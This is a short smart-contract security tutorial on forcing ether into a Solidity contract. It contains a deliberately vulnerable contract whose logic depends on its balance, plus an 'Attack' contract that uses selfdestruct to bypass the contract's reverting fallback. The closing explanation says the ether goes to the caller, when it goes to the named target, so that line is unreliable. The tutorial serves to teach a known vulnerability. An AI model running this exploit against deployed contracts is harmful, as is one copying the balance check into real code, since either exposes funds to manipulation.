## Forcing ether to a contract

The special case here, is that if the receiving address is a contract, its fallback function does not get executed.

This means that if a contract’s function has a conditional statement that depends on that contract’s balance being below a certain amount, that statement can be potentially bypassed:

```solidity
pragma solidity 0.4.18;

contract ForceEther {

  bool youWin = false;

  function onlyNonZeroBalance() {
      require(this.balance > 0); 
      youWin = true;
  }
  // throw if any ether is received
  function() payable {
    revert();
  }
         
}
```

Due to the throwing fallback function, normally the contract cannot receive ether. However, if a contract selfdestructs with this contract as a target, the fallback function does not get called. As a result this.balance becomes greater than 0, and thus the attacker can bypass the require statement in onlyNonZeroBalance

## Hack the Contract

```solidity

pragma solidity 0.4.18;
contract Attack {
    ForceEther forceether;
    
    function Attack(ForceEther _forceether) public {
        forceether = ForceEther(_forceether);
    }

    function attack() public {
        selfdestruct(forceether);
    }
    function getbal() external view returns(uint) {
        return address(this).balance;
    }
    function() payable public {
  }
}
```

## How thiss exploit work?
This Exploit use selfdestruct. Selfdestruct Kill the contract and send the all the ether to the caller contract wheather the caller have paybale function or not
